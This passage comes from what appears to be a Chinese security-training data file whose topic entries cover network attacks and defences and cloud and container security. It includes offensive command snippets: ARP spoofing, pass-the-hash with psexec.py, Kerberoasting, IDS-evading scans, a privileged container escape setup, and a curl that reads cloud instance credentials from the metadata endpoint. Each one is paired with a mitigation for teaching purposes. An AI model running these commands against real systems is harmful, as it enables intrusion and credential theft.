            "高级": "深入：IPv6 下的 ND（邻居发现）欺骗、企业网段隔离与 802.1X、以及 ARP 欺骗在红队中的横向定位价值。强调：二层欺骗的根本缓解是网络分段 + 端口安全 + 加密。"
          },
          codeLang: "bash",
          code:
`# 授权内网测试：双向 ARP 欺骗（需开启转发）
sysctl -w net.ipv4.ip_forward=1
arpspoof -i eth0 -t 192.168.1.10 192.168.1.1   # 受害者 <-> 网关
# 防御：交换机启用 DAI（Dynamic ARP Inspection）+ DHCP Snooping`,
          tool: "Ettercap、arpspoof、Bettercap",
          refs: "MITRE T1557（中间人）；局域网安全技术"
        },
        {
          id: "net-lateral", name: "内网横向移动", level: "高级",
          summary: "突破边界进入内网后，借助凭据复用与信任关系在网络内扩散。",
          keywords: ["横向移动","lateral movement","凭据传递","pth","wmi","psexec","ipc$","pass the hash"],
          levels: {
            "入门": "进了内网一台机器后，不直接走，而是利用这台机器上保存的密码或信任关系，去控制更多机器，一步步逼近重要目标。",
            "初级": "手段：凭据传递（Pass-the-Hash/Pass-the-Ticket）、WMI/PsExec 远程执行、IPC$ 共享、计划任务、远程服务。前提：往往来自弱密码、凭据复用、未做网络隔离。工具：Impacket、CrackMapExec。",
            "中级": "实战：导出内存哈希（Mimikatz，授权）；PTH 横向到其它主机；利用共享管理员账号批量移动；定位域控。防御：分层凭据、LAPS 随机化本地管理员、网络微隔离、特权访问管理（PAM）。",
            "高级": "深入：票据委派（约束/无约束）滥用、从主机到云的横向（Azure AD）、以及 living-off-the-land 减少痕迹。强调：横向移动依赖扁平网络 + 凭据复用，分段与最小权限是最好的止血。"
          },
          codeLang: "bash",
          code:
`# 授权测试：凭据传递横向（Impacket 示意）
# 用抓到的 NTLM 哈希直接认证，无需明文密码
psexec.py DOMAIN/user@target -hashes :<NTLM>
# 防御：LAPS 随机化本地管理员密码 + 网络分段 + 禁用明文凭据缓存`,
          tool: "Impacket、CrackMapExec、Mimikatz（授权）",
          refs: "MITRE ATT&CK 横向移动；Red Forest/PAM 设计"
        },
        {
          id: "ad-pentest", name: "域渗透 Active Directory", level: "高级",
          summary: "针对企业域环境的认证协议与信任关系实施攻击（Kerberos 等）。",
          keywords: ["域渗透","active directory","kerberos","黄金票据","白银票据","as-rep roasting","spn","委派"],
          levels: {
            "入门": "公司里常有一台总管机器（域控）管所有账号。域渗透就是研究这套管理机制里的弱点，拿到最高权限。",
            "初级": "Kerberos 流程：AS-REQ/AS-REP（拿 TGT）、TGS-REQ/TGS-REP（拿服务票据）。攻击：AS-REP Roasting（无预认证账号）、Kerberoasting（破服务票据密码）、委派滥用。工具：Impacket GetNPUsers/GetUserSPNs。",
            "中级": "实战：查找无预认证用户做 AS-REP Roasting；请求 SPN 票据离线爆破；利用约束委派到无约束委派；伪造票据（黄金/白银，需 krbtgt 哈希）。防御：强密码加审计、减少委派、启用 PAC 验证。",
            "高级": "深入：DCSync（模拟域控复制）、基于 ACL 的域对象滥用、以及 BloodHound 路径分析找最短提权链。强调：AD 安全靠最小权限的 ACL + 强凭据 + 持续审计，票据类攻击本质是密钥或权限管理失当。"
          },
          codeLang: "bash",
          code:
`# 授权测试：Kerberoasting 请求服务票据（Impacket）
GetUserSPNs.py DOMAIN/user:pass -request -output tickets.txt
# 离线用 hashcat 爆破服务账号弱密码
# 防御：服务账号强密码 + 定期轮换 krbtgt 密钥（两次）`,
          tool: "Impacket、BloodHound、Cerbero",
          refs: "MITRE ATT&CK 域滥用；AD 安全运维"
        },
        {
          id: "fw-bypass", name: "防火墙/IDS/IPS 绕过", level: "中级",
          summary: "利用检测规则的盲区与协议特性，规避网络边界防护。",
          keywords: ["防火墙绕过","ids ips 绕过","分片","低速扫描","加密隧道","evasion","waf绕过"],
          levels: {
            "入门": "防火墙像看门的，按规则放人或拦人。攻击者会想规则没覆盖的招数，比如把数据拆碎、走加密通道，让它看不清从而放行。",
            "初级": "思路：分片或异常包（IDS 重组与主机不一致）；低速慢速扫描避开阈值；加密隧道（VPN/TLS）隐藏内容；利用允许的业务端口（80/443）隧道化。WAF：编码或分块绕过规则。",
            "中级": "实战：用 nmap 时序参数（-T1/-T2）慢扫；对 WAF 做编码/注释/大小写混淆；借 CDN 或合法域名做 C2 反连。防御：全流量深度检测、行为基线、内网东西向也布防（不只在边界）。",
            "高级": "深入：协议语义差异导致的检测绕过、加密流量中的元数据泄露（SNI/证书）、以及绕过与误报治理的平衡。强调：边界防护不是银弹，纵深防御（边界 + 主机 + 行为）才是关键。"
          },
          codeLang: "bash",
          code:
`# 慢速扫描规避阈值（授权）
nmap -T2 -sS --max-rate 10 target.com
# WAF 绕过示意：编码/分块使规则失配（仍走合法协议）
# 防御：全流量镜像 + 行为分析 + 内网微隔离`,
          tool: "Nmap 时序、WAFw00f、ModSecurity 规则分析",
          refs: "IDS/IPS 规避技术；纵深防御架构"
        },
        {
          id: "net-devices", name: "常见网络设备与拓扑", level: "入门",
          summary: "交换机、路由器、防火墙、代理各管什么；看懂拓扑才能理解攻击路径与隔离效果。",
          keywords: ["交换机","路由器","防火墙","代理","vlan","拓扑"],
          levels: {
            "入门": "家里/公司上网要经过几台设备：交换机把同一网段的设备连起来，路由器负责跨网段转发，防火墙决定哪些流量能过。",
            "初级": "要点：交换机工作在二层（MAC）、路由器在三层（IP）、防火墙按策略过滤、代理代收发请求。VLAN 用来做网络隔离，隔离不当会让内网横向变得容易。",
            "中级": "实战：画出目标拓扑与区域（外网/ DMZ / 办公网 / 核心区），标出区域间的放通规则；多数横向移动发生在「本该隔离但没隔离」的地方。",
            "高级": "深入：微隔离与零信任的落地差异、东西向流量的检测盲区，以及冗余链路与旁路带来的隐蔽通道。",
          },
          codeLang: "text",
          code:
`典型分区（越靠内越敏感）
外网 → 边界防火墙 → DMZ（对外服务） → 内网防火墙 → 办公网 / 核心数据区
检查点：区域之间哪些端口放通？谁可以访问管理面？`,
          tool: "拓扑图工具、防火墙策略核对",
          refs: "网络基础；分区与隔离"
        },
        {
          id: "net-packet", name: "抓包入门：看懂一次会话", level: "入门",
          summary: "抓包是把「网络上传了什么」记录下来；先会看一次完整的请求响应，再谈异常检测。",
          keywords: ["抓包","wireshark","tcpdump","会话","明文","分析"],
          levels: {
            "入门": "抓包就是给网络装个录音机。打开 Wireshark 选网卡，就能看到本机收发的每个包——先找一次完整对话，看清谁先说话、说了什么。",
            "初级": "基本操作：选接口 → 过滤（如 http 或 ip.addr==x）→ 跟着一次 TCP 流看完整内容（Follow TCP Stream）。明文协议能直接看到账号口令。",
            "中级": "实战：判断异常时看「频率、目标、大小、时间」；例如固定间隔的小包可能是心跳，半夜的大流量上传可能是外传。抓包也是验证「是否真的加密」的最快方式。",
            "高级": "深入：TLS 之后要靠元数据与指纹分析；交换机镜像口/分光（TAP）用于全流量采集，注意抓包本身对性能与隐私的影响。",
          },
          codeLang: "bash",
          code:
`# 抓包入门（本机示例）
tcpdump -i any -n port 80 -A        # 命令行看 HTTP 明文
# 或打开 Wireshark：选接口 → 过滤 http → 右键 Follow HTTP/TCP Stream`,
          tool: "Wireshark、tcpdump、tshark",
          refs: "抓包分析方法"
        },
        {
          id: "net-nat", name: "NAT 与端口映射", level: "初级",
          summary: "NAT 让内网共用公网地址；端口映射把外部流量送进内网，配错就等于开了一道门。",
          keywords: ["nat","端口映射","端口转发","内外网","暴露面"],
          levels: {
            "入门": "家里多台设备共用一条宽带，靠的就是 NAT：对外看起来只有一个地址。如果要把内网某台机器暴露到外网，就得做端口映射。",
            "初级": "要点：SNAT（内网访问外网）、DNAT（外网访问内网）、PAT（端口区分多设备）。端口映射是攻击面扩大的常见来源。",
            "中级": "实战：把「对外映射了哪些端口」当资产清单维护，逐个核对业务必要性；管理端口（22/3389/数据库）绝不应直接暴露到公网。",
            "高级": "深入：IPv6 普及后 NAT 的遮蔽作用消失，暴露面管理逻辑要改变；同时注意 UPnP 自动映射带来的隐蔽入口。",
          },
          codeLang: "bash",
          code:
`# 核对本机监听与外部可达（授权核查）
ss -lntp                          # 看监听端口与服务
nmap -Pn -p- <公网地址> --top-ports 1000   # 站外视角看暴露面
# 原则：管理端口不对外；必须对外时加白名单与双因素`,
          tool: "ss/netstat、nmap、防火墙策略核对",
          refs: "NAT 原理；暴露面管理"
        },
        {
          id: "net-wifi", name: "无线安全与弱加密", level: "中级",
          summary: "Wi-Fi 是物理边界之外最容易被翻越的一环：弱加密、弱口令与配置错误都能让攻击者进入内网。",
          keywords: ["wifi","wpa2","wpa3","弱口令","钓鱼热点","物理安全"],
          levels: {
            "入门": "Wi-Fi 是「看不见的网线」：附近的人只要拿到密码（或破解），就和坐在办公室一样在内网里。",
            "初级": "加密对比：WEP 已被淘汰（可快速破解）、WPA2 需强口令、WPA3 更强。风险还包括默认口令、WPS 开启、以及员工私接热点。",
            "中级": "实战：检查企业无线是否用 WPA2/3 企业级认证（802.1X）、访客网是否与内网隔离、是否有钓鱼热点风险（同名 AP 诱导连接）。",
            "高级": "深入：无线侧要做准入与隔离（访客网独立 + 内网访问审计），并防范「员工手机分享热点」这类绕过网络边界的做法。",
          },
          codeLang: "text",
          code:
`无线安全自查
□ 企业无线是否使用 WPA2/3-Enterprise（802.1X）而非共享口令？
□ 访客网络是否与内网隔离？是否限速与审计？
□ 是否关闭 WPS？是否更换了默认管理口令？
□ 是否禁止私接无线路由与个人热点连内网？`,
          tool: "无线扫描工具、802.1X 认证平台",
          refs: "无线安全实践"
        },
        {
          id: "net-tunnel", name: "隧道与隐蔽通道", level: "高级",
          summary: "把一种协议藏在另一种协议里传输，用于绕过封禁或隐蔽外联，也是数据外传的常见通道。",
          keywords: ["隧道","隐蔽通道","dns隧道","icmp","代理","外联"],
          levels: {
            "入门": "隧道就是把 A 协议装进 B 协议里传输，像把信塞进快递箱：检查的人只看到快递箱。",
            "初级": "常见形式：DNS 隧道（用域名查询搬运数据）、ICMP 隧道、HTTP(S) 代理与 WebSocket 长连接；企业侧常关心「是否有绕过出口管控的外联」。",
            "中级": "实战：检测思路是看「不成比例的特征」——大量异常 DNS 查询、异常长度的子域、非常规协议的固定心跳、以及非工作时段的长连接。",
            "高级": "深入：合法业务也会用隧道（如 VPN、零信任网关），所以判定要看「目的地是否可解释、是否有数据量异常」，并与资产与业务清单核对。",
          },
          codeLang: "text",
          code:
`隐蔽通道检测线索
· DNS：超长子域、高频查询、单一域名大量不同类型记录
· ICMP：异常大包或高频请求
· 长连接：固定间隔心跳、非工作时段持续在线
判定关键：目的地址是否在资产/业务白名单内`,
          tool: "Zeek、DNS 日志分析、NDR",
          refs: "隐蔽通道检测实践"
        },
        {
          id: "net-monitor", name: "网络流量监控与 NDR", level: "中级",
          summary: "流量侧看得见才防得住：全流量或元数据采集，配合基线发现异常通信。",
          keywords: ["流量监控","ndr","元数据","镜像","基线","netflow"],
          levels: {
            "入门": "网络监控就是记录「谁和谁在通信」。即使内容加密，通信对象与频率一样能暴露问题。",
            "初级": "两种做法：元数据（NetFlow/IPFIX，轻量）与全流量（镜像/TAP，可回溯内容）；输出给 SIEM 或 NDR 做分析。",
            "中级": "实战：先用元数据建「正常通信基线」（哪些主机该访问哪些网段），再对偏离告警；全流量留给需要内容回溯的场景（如取证）。",
            "高级": "深入：加密普及后重点转向元数据与指纹（JA3/JA4、证书特征）；同时注意采集点的合规与隐私边界（内容留存需授权与脱敏）。",
          },
          codeLang: "text",
          code:
`采集方案取舍
元数据（NetFlow）：轻量、可长期保留 → 适合基线与异常发现
全流量（镜像/TAP）：重、保留短 → 适合取证与深度检测
建议：元数据常态开，全流量按需开并可回溯`,
          tool: "NetFlow、Zeek、NDR 平台",
          refs: "流量分析实践"
        },
        {
          id: "net-vpn", name: "VPN 与远程接入安全", level: "中级",
          summary: "远程接入是企业边界的延伸：认证强度、最小权限与审计决定它是不是一个「后门」。",
          keywords: ["vpn","远程接入","双因素","最小权限","审计"],
          levels: {
            "入门": "员工在家办公要连回公司，靠的就是 VPN。它像一条隧道：进去了就在内网里，所以「谁能进、进去能到哪」必须管住。",
            "初级": "风险点：只靠口令（易被钓鱼）、账号共享、接入后能访问全部网段、以及没有接入与访问审计。",
            "中级": "实战：强制双因素认证、按人分配账号、限定可访问网段（最小权限）、记录接入日志并接入 SIEM；对离职账号当天回收。",
            "高级": "深入：向零信任演进——不再「进网即信任」，而是每次访问都校验身份与设备状态；同时注意 VPN 设备自身漏洞（常被当作入口）。",
          },
          codeLang: "text",
          code:
`远程接入检查
□ 是否强制双因素认证（不能只靠口令）？
□ 账号是否一人一号、无共享？
□ 接入后能否访问全部网段？（应最小化）
□ 接入与访问是否留存审计并接入检测？
□ VPN 设备固件是否及时更新？`,
          tool: "VPN/零信任网关、认证平台",
          refs: "远程接入安全实践"
        },
        {
          id: "net-segment", name: "网络分区与微隔离", level: "高级",
          summary: "横向移动之所以容易，是因为内网「处处可达」；分区与微隔离把可达性降到最小。",
          keywords: ["分区","微隔离","横向移动","可达性","dmz","零信任"],
          levels: {
            "入门": "如果内网所有机器都能互相访问，攻击者拿到一台就等于拿到一片。分区就是给内网也修墙。",
            "初级": "做法：按业务与敏感度划分区域（办公网、测试网、核心区、DMZ），区域之间只放通必要流量，并记录跨区访问。",
            "中级": "实战：先画出「谁需要访问谁」的连通矩阵，再按矩阵收策略；优先切断「办公网 → 核心数据区」「任意主机 → 数据库」的直连。",
            "高级": "深入：主机级微隔离（按标签/身份放通）比网段级更细，但维护成本高；要用自动化从真实流量学习基线，逐步收敛到最小可达。",
          },
          codeLang: "text",
          code:
`连通矩阵（示例）
            外网  DMZ  办公网  核心区  数据库
外网         -    ✓     ✗      ✗      ✗
DMZ          ✗    -     ✗      ✓*     ✗
办公网        ✗    ✗     -      ✗*     ✗
核心区        ✗    ✗     ✗      -      ✓
（* 仅特定端口；其余默认拒绝）`,
          tool: "防火墙策略工具、微隔离平台",
          refs: "分区与微隔离实践"
        },
        {
          id: "net-dns-sec", name: "DNS 安全加固", level: "中级",
          summary: "DNS 是几乎所有访问的第一步，也是攻击者的高频目标：投毒、劫持、隧道与恶意域名。",
          keywords: ["dns","dnssec","劫持","隧道","日志","恶意域名"],
          levels: {
            "入门": "上网第一步是「查地址」（DNS）。如果这一步被做手脚，你要访问的网站可能被指向攻击者的服务器。",
            "初级": "加固项：使用可信递归解析、开启 DNSSEC（若支持）、内部解析与外部解析分离、以及记录查询日志用于检测。",
            "中级": "实战：DNS 日志是威胁狩猎的金矿——可发现恶意域名解析、DNS 隧道（超长子域）、以及内部主机的异常外联；配合情报做黑名单与告警。",
            "高级": "深入：注意 DNS 基础设施自身的安全（递归服务器被滥用做放大攻击）、以及加密 DNS（DoH/DoT）带来的可见性下降问题。",
          },
          codeLang: "text",
          code:
`DNS 安全要点
· 解析器：选可信递归，必要时开启 DNSSEC 校验
· 分离：内部域名内部解析，避免泄露拓扑
· 日志：保留查询日志并接入检测（隧道/恶意域名）
· 注意：DoH/DoT 会降低企业侧可见性，需策略权衡`,
          tool: "DNS 服务器加固、DNS 日志分析",
          refs: "DNS 安全加固实践"
        },
        {
          id: "net-dhcp", name: "DHCP 与地址欺骗", level: "中级",
          summary: "自动获取地址的协议若被冒充，攻击者就成了你的网关与 DNS，流量随之被接管。",
          keywords: ["dhcp","地址分配","欺骗","rogue dhcp","网关"],
          levels: {
            "入门": "连网时设备会自动要一个 IP 地址，这个请求没有身份校验——谁答得快，设备就听谁的。",
            "初级": "攻击方式：架设伪造 DHCP 服务器，把网关和 DNS 指向自己，从而中间人劫持；也可耗尽地址池造成拒绝服务。",
            "中级": "实战排查：看是否有非授权 DHCP 服务器（交换机 DHCP Snooping 能拦）、看客户端拿到的网关/DNS 是否与基线一致、看租约异常变化。",
            "高级": "深入：结合 802.1X 准入与端口安全限制私接设备；对有线和无线统一策略，避免无线侧被当成绕过入口。",
          },
          codeLang: "text",
          code:
`检查要点
· 交换机是否开启 DHCP Snooping（只信任上联口）
· 终端拿到的网关/DNS 是否符合基线？
· 是否存在未登记的私接路由或随身 Wi-Fi
`,
          tool: "DHCP Snooping、网络准入、抓包分析",
          refs: "网络准入与二层安全"
        },
        {
          id: "net-bastion", name: "堡垒机与运维通道", level: "初级",
          summary: "把「谁能登进服务器」收敛到统一通道：集中认证、录屏审计、按需授权。",
          keywords: ["堡垒机","跳板","运维审计","录屏","按需授权"],
          levels: {
            "入门": "运维要登录服务器，如果人人都能直连，出了事查不出是谁做的。堡垒机就是那个统一的门口。",
            "初级": "能力：统一认证（含双因素）、集中授权（谁能连哪台）、全程录屏与命令审计、按需临时授权。",
            "中级": "实战：把直连路径收掉（安全组只允许堡垒机访问）、高危命令告警、离职当天回收账号；注意堡垒机自身的权限别给太大。",
            "高级": "深入：堡垒机是「通往所有服务器」的单点，必须重点防护（补丁、双因素、审计日志外发），并防止其成为横向跳板。",
          },
          codeLang: "text",
          code:
`堡垒机落地要点
1) 安全组只放堡垒机来源，禁止终端直连生产
2) 统一认证 + 双因素；一人一号
3) 高危命令（rm/drop/权限变更）实时告警
4) 录屏与命令日志外发到独立存储
`,
          tool: "堡垒机、双因素认证、命令审计",
          refs: "运维安全与访问审计"
        },
        {
          id: "net-proxy", name: "代理与出网管控", level: "中级",
          summary: "把服务器的出网收敛到可控出口：能审计、能拦截、能限制——否则数据外传与 C2 都不好发现。",
          keywords: ["代理","出网管控","白名单","审计","c2"],
          levels: {
            "入门": "服务器能自由访问外网时，被入侵后也能自由把数据送出去。统一出口就是给它加一道关卡。",
            "初级": "做法：所有出网走统一代理，按域名/IP 白名单放通，记录访问日志；禁止服务器直连公网。",
            "中级": "实战：日志接入检测（异常域名、少见目的地、非工作时段大流量上传）；对必须直连的场景单独开例外并登记。",
            "高级": "深入：出网代理要防绕过（如 DNS 外带、直连 IP 绕过域名白名单），因此要同时管 DNS 与网络边界策略，形成多层约束。",
          },
          codeLang: "text",
          code:
`出网管控三件套
1) 统一代理 + 域名白名单（默认拒绝）
2) 全量出网日志（谁访问了什么、多少流量）
3) 绕过防护：管住 DNS、封掉直连公网，例外需登记
`,
          tool: "正向代理、SWG、出网日志分析",
          refs: "出网安全与数据外传防护"
        },
        {
          id: "net-ipv6", name: "IPv6 安全与双栈风险", level: "高级",
          summary: "双栈环境下 IPv6 常被遗忘：策略没覆盖、日志没采集，于是成了绕过防线与隐蔽通信的通道。",
          keywords: ["ipv6","双栈","策略盲区","暴露面","邻居发现"],
          levels: {
            "入门": "新一代网络地址（IPv6）在不少环境里悄悄开着，但安全策略往往只配了 IPv4——等于开了扇没人管的门。",
            "初级": "风险点：IPv6 未做防火墙策略、日志未采集、终端自动配置地址造成意外暴露；IPv6 下 NAT 的遮蔽效应消失。",
            "中级": "实战：盘点是否有 IPv6 地址与路由、策略是否与 IPv4 一致、日志是否覆盖；对不需要 IPv6 的环境直接关闭。",
            "高级": "深入：注意隧道机制（6to4/Teredo）可绕过 IPv4 策略，以及邻居发现（ND）欺骗与 IPv6 下的扫描特性差异。",
          },
          codeLang: "bash",
          code:
`双栈盘点
ip -6 addr show          # 是否有 IPv6 地址
ip -6 route              # 是否有 IPv6 路由/默认网关
# 关键：防火墙 IPv6 策略是否与 IPv4 一致？日志是否采集 IPv6 流量？
`,
          tool: "IPv6 策略检查、ND 分析",
          refs: "IPv6 安全实践"
        },
        {
          id: "net-ztna", name: "零信任网络访问（ZTNA）", level: "高级",
          summary: "不再「进网即信任」，而是每次访问都校验身份与设备状态；替代传统 VPN 的粗放放通。",
          keywords: ["零信任","ztna","持续校验","设备状态","最小可达"],
          levels: {
            "入门": "老办法是先连进公司网，进去后想去哪都行。零信任改成：每次访问都要单独校验，且只能到你该去的地方。",
            "初级": "三要素：身份（谁）、设备（是否合规）、上下文（何时何地访问什么）；按应用粒度授权而非按网段。",
            "中级": "实战：先做「应用清单 + 访问关系」梳理，再逐个应用收紧；与传统 VPN 并存过渡，避免一次性切换影响业务。",
            "高级": "深入：ZTNA 的落地难点在身份与设备数据的质量、以及策略运营（谁能改策略、如何复核）；要防止策略膨胀退化回「全放通」。",
          },
          codeLang: "text",
          code:
`零信任落地顺序
1) 应用与访问关系清单（谁需要访问什么）
2) 身份 + 设备合规作为决策输入
3) 按应用粒度授权（不用网段）
4) 策略定期复核 + 变更留痕
`,
          tool: "ZTNA 平台、设备合规、身份联邦",
          refs: "零信任架构实践"
        },
      ]
    },
    /* ---------------- 云原生与容器安全 ---------------- */
    {
      id: "cloud", name: "云原生与容器安全", icon: "☁️",
      desc: "覆盖云安全责任共担、IAM、容器逃逸、Kubernetes、Serverless 与元数据防护，适配现代上云架构。",
      topics: [
        {
          id: "shared-resp", name: "云安全责任共担", level: "入门",
          summary: "明确云厂商与客户各自的安全边界，避免「以为是厂商管」的盲区。",
          keywords: ["责任共担","shared responsibility","云安全","客户责任","厂商责任","合规"],
          levels: {
            "入门": "用云就像租大楼：物业（云厂商）管大楼结构和公共区域，你租的房间里面怎么锁门、放什么，得自己负责。搞清边界才不会留漏洞。",
            "初级": "通用模型：厂商负责云本身（硬件、虚拟化、网络基础设施、托管服务的安全）；客户负责云里的内容（身份与访问、数据、操作系统补丁、配置、应用）。IaaS/PaaS/SaaS 边界逐层上移。误解常导致配置暴露。",
            "中级": "实战：核对所用服务的共担矩阵；重点自查客户侧配置（存储桶公开、密钥泄露、过度授权）；把责任边界写进安全检查清单。常见事故：公开 S3/OSS 桶、误配安全组放通 0.0.0.0/0。",
            "高级": "深入：托管服务（如托管数据库）的责任切分细节、多租户隔离假设、以及合规映射（等保/ISO 对共担的要求）。强调：共担不是甩锅，客户侧配置错误是云上绝大多数泄露的根因。"
          },
          codeLang: "text",
          code:
`# 共担速记（AWS/Azure/阿里云 通用）
# 厂商负责：物理、Hypervisor、网络基础设施、托管服务安全
# 客户负责：IAM、数据加密与密钥、OS 补丁、网络安全组、应用
# 自查清单：存储桶权限、安全组 0.0.0.0/0、密钥硬编码、过度授权`,
          tool: "各云共担责任白皮书、配置基线扫描器",
          refs: "AWS/Azure/GCP 共担模型；CSA 云控制矩阵"
        },
        {
          id: "iam", name: "IAM 与最小权限", level: "初级",
          summary: "云身份与访问管理的配置错误是云上入侵的首要入口。",
          keywords: ["iam","最小权限","角色","策略","凭证","ak/sk","权限提升","云身份"],
          levels: {
            "入门": "云里每个程序、每个人都有一个身份和对应的能做什么的清单。清单给太宽（比如能删库），一旦钥匙泄露后果严重。",
            "初级": "要点：用户/角色/策略的区分；AK/SK（访问密钥）长期有效且易泄露；过度授权（*.*）埋雷；权限提升路径（被忽略的 PassRole/AssumeRole）。原则：默认无权限、按需授予、定期回收。",
            "中级": "实战：用云原生 Access Analyzer 找对外暴露的角色；审计策略是否含通配与敏感 Action；用临时凭证（STS）替代长期 AK；启用 MFA 与密钥轮转。防御：策略最小化 + 访问分析 + 审计日志。",
            "高级": "深入：跨账号信任与角色链、权限策略与边界（Permissions Boundary）的博弈、以及一个被忽略的策略如何串成完整提权。强调：IAM 是云上安全的命门，最小权限 + 持续审计胜过任何边界设备。"
          },
          codeLang: "json",
          code:
`// ❌ 危险：通配授权，拿到 AK 即失控
{ "Effect": "Allow", "Action": "*", "Resource": "*" }

// ✅ 安全：最小权限 + 条件（仅来源 IP + 需 MFA）
{ "Effect": "Allow", "Action": ["s3:GetObject"],
  "Resource": "arn:aws:s3:::app-bucket/*",
  "Condition": { "Bool": { "aws:MultiFactorAuthPresent": "true" } } }`,
          tool: "AWS IAM Access Analyzer、云审计工具",
          refs: "云厂商 IAM 最佳实践；CIS 云基准"
        },
        {
          id: "container-escape", name: "容器逃逸", level: "高级",
          summary: "利用容器运行时/内核缺陷或危险配置，突破隔离获得宿主机权限。",
          keywords: ["容器逃逸","docker escape","特权容器","挂载逃逸","runc","cve-2019-5736","kata"],
          levels: {
            "入门": "容器像轻量小房间，本应与外界隔离。如果配置不当或容器软件有漏洞，攻击者能从房间里破墙出来，控制整台宿主机。",
            "初级": "常见路径：特权容器（--privileged，可直接访问宿主设备）、挂载宿主文件系统（docker.sock 或 / 挂载）、危险 Capabilities、危险 syscalls、以及 runc/containerd 的漏洞（如 CVE-2019-5736）。",
            "中级": "实战：检查容器是否特权或挂载敏感目录；通过 docker.sock 创建新特权容器；利用 runc 漏洞改写宿主二进制。防御：非特权运行、降权 Capabilities、用 gVisor/Kata 等强隔离、禁止挂载 docker.sock。",
            "高级": "深入：内核漏洞在容器上下文的利用、eBPF 与可观测性的攻防、以及 K8s 中从单容器到控制平面的升级路径。强调：容器隔离依赖内核，配置错误比漏洞更常见，默认最小特权最关键。"
          },
          codeLang: "bash",
          code:
`# ❌ 危险：特权容器 + 挂载宿主，极易逃逸
docker run --privileged -v /:/host busybox

# ✅ 安全：非特权、只读根、降权能力
docker run --cap-drop=ALL --security-opt=no-new-privileges \
           --read-only myapp
# 强隔离可选：--runtime=kata 或 gVisor`,
          tool: "amicie（检测）、容器基线扫描（Trivy）、runc 补丁",
          refs: "CVE-2019-5736；CIS Docker 基线；CNCF 运行时安全"
        },
        {
          id: "k8s", name: "Kubernetes 安全", level: "高级",
          summary: "K8s 控制平面与 workload 的配置缺陷是云原生环境的主要风险。",
          keywords: ["kubernetes","k8s","rbac","secret","etcd","pod安全","admission","供应链"],
          levels: {
            "入门": "Kubernetes 是管理很多容器的总调度。它自身有一套权限和配置，配错了（比如谁都能管集群）就会被整体攻陷。",
            "初级": "风险点：RBAC 过宽（cluster-admin 泛滥）、Secret 明文或可被读、etcd 未鉴权、Pod 安全上下文缺失（跑 root）、准入控制缺失、Dashboard 暴露。攻击链：控 API Server → 调度恶意 Pod → 逃逸。",
            "中级": "实战：审计 RBAC（谁有 exec/create）；检查 Pod 是否非 root 加只读根；用 NetworkPolicy 做东西向隔离；镜像扫描加准入策略（OPA/Gatekeeper）。防御：最小 RBAC + Pod 安全准入 + 镜像签名。",
            "高级": "深入：etcd 被控即控集群、Workload 身份与云 IAM 联动、以及供应链（CI 注入镜像）到集群的完整链。强调：K8s 安全是配置即安全，默认不安全，必须显式加固每一层。"
          },
          codeLang: "yaml",
          code:
`# ✅ Pod 安全上下文（最小特权）
securityContext:
  runAsNonRoot: true
  readOnlyRootFilesystem: true
  allowPrivilegeEscalation: false
  capabilities: { drop: ["ALL"] }
# ✅ NetworkPolicy 限制东西向流量（默认拒绝）`,
          tool: "kubectl 审计、Trivy、OPA/Gatekeeper、kube-hunter",
          refs: "CIS Kubernetes 基准；K8s 安全文档；NSA K8s 加固指南"
        },
        {
          id: "serverless", name: "Serverless 安全", level: "中级",
          summary: "函数即服务（FaaS）的新攻击面：事件注入、权限过大与第三方依赖。",
          keywords: ["serverless","faas","函数安全","事件注入","lambda","依赖","冷启动"],
          levels: {
            "入门": "Serverless 是写好函数、平台帮你跑的模式，没有固定服务器。但它也有自己的坑：函数被触发时收到的数据，如果没处理好，照样能出事。",
            "初级": "风险：事件或数据注入（函数把不可信输入当指令）、过度授权（一个函数有全账号权限）、第三方依赖含漏洞、以及函数间调用链信任过度。无服务器不等于无责任，配置与代码仍归你。",
            "中级": "实战：严格校验事件源与负载；每个函数最小 IAM 角色；锁定依赖版本加扫描；注意并发下的状态污染（函数本应无状态）。防御：最小权限 + 输入校验 + 依赖治理。",
            "高级": "深入：跨函数调用链的信任传递、Layers/环境变量中的密钥泄露、以及函数作为入口在整体架构里的边界。强调：Serverless 把攻击面从主机变成事件与权限，治理重心随之转移。"
          },
          codeLang: "json",
          code:
`// ❌ 危险：函数角色过宽 + 直接使用事件体当指令
{ "Effect":"Allow", "Action":"*", "Resource":"*" }
// 且：eval(event.body.command)

// ✅ 安全：每函数独立最小角色 + 校验事件结构
// 用 JSON Schema 校验 event，拒绝未知字段`,
          tool: "函数级 IAM、依赖扫描、事件校验库",
          refs: "OWASP Serverless Top 10；云厂商函数安全指南"
        },
        {
          id: "metadata", name: "云元数据与凭证泄露", level: "中级",
          summary: "实例元数据服务（IMDS）可被 SSRF 或误配读取，泄露临时凭证。",
          keywords: ["元数据","imds","169.254.169.254","临时凭证","ssrf","云凭证","instance metadata"],
          levels: {
            "入门": "云服务器内部有个悄悄告诉自己身份信息的接口。如果网站能被诱导去访问这个接口，就可能把临时钥匙交出去，攻击者据此控制云资源。",
            "初级": "IMDS（169.254.169.254）返回实例角色临时凭证与环境信息。风险来自：SSRF 打穿到元数据；IMDSv1 可被简单请求读取；应用把凭证写到前端或日志。后果：横向到云账号。",
            "中级": "实战：SSRF 请求 http://169.254.169.254/latest/meta-data/iam/security-credentials/；拿临时 AK 后操作目标云资源；检查是否 IMDSv2（需 token）。防御：强制 IMDSv2（带 hop-limit）、修复 SSRF、凭证不落前端。",
            "高级": "深入：IMDSv2 的防绕过（Token 不可外部获取）、元数据与实例角色链、以及云内 SSRF 控云在企业中的真实路径。强调：元数据是云上最危险的内部接口，必须用 IMDSv2 + 阻断 SSRF 双保险。"
          },
          codeLang: "bash",
          code:
`# ❌ 危险：SSRF 可读取实例临时凭证（IMDSv1）
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/role

# ✅ 防御：强制 IMDSv2（需会话 token，外部不可得）
aws ec2 modify-instance-metadata-options \
  --http-tokens required --http-put-response-hop-limit 1`,
          tool: "SSRF 测试、云配置审计",
          refs: "云厂商 IMDSv2 文档；Capitol One 事件复盘"
        },
        {
          id: "cloud-services", name: "云上都有什么：计算/存储/网络", level: "入门",
          summary: "云把机房拆成可租用的积木：虚拟机、对象存储、VPC 网络、身份与密钥服务。",
          keywords: ["云计算","iaas","对象存储","vpc","安全组","服务模型"],
          levels: {
            "入门": "云就是「按需租用的机房」：要服务器租虚拟机，要存文件用对象存储，要组网用虚拟网络，要管账号用云的身份服务。",
            "初级": "常见积木：计算（VM/容器/函数）、存储（对象/块/文件）、网络（VPC、子网、安全组、负载均衡）、身份（账号/角色/密钥）、以及日志与监控。",
